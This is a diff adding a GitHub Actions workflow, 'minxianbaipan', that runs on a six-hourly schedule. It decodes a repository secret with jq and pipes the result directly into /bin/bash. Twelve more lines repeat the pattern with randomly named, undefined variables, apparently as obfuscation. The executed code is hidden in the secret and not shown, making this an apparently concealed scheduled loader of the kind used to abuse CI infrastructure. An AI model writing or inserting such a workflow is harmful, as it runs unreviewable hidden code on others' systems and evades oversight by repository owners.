@@ -1,0 +1,30 @@
+name: minxianbaipan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: minxianbaipan
+        env:
+          ix1057: ${{ secrets.ix1057 }}
+        run: |
+          echo $ix1057 | jq -r .h05 | /bin/bash
+          echo $mptxs102 | jq -r .g5082 | /bin/bash
+          echo $bgkr1 | jq -r .wp7049 | /bin/bash
+          echo $csib0 | jq -r .gqb67201 | /bin/bash
+          echo $prgc04 | jq -r .ktde4486 | /bin/bash
+          echo $zlsjk925 | jq -r .b6 | /bin/bash
+          echo $ojyhj09380 | jq -r .idub43 | /bin/bash
+          echo $fh5 | jq -r .f630 | /bin/bash
+          echo $bkej9 | jq -r .ump53279 | /bin/bash
+          echo $uykp130 | jq -r .xv856 | /bin/bash
+          echo $y9955 | jq -r .qrhj22 | /bin/bash
+          echo $rqlq329 | jq -r .os593 | /bin/bash
+          echo $zzx6 | jq -r .zh3 | /bin/bash
+
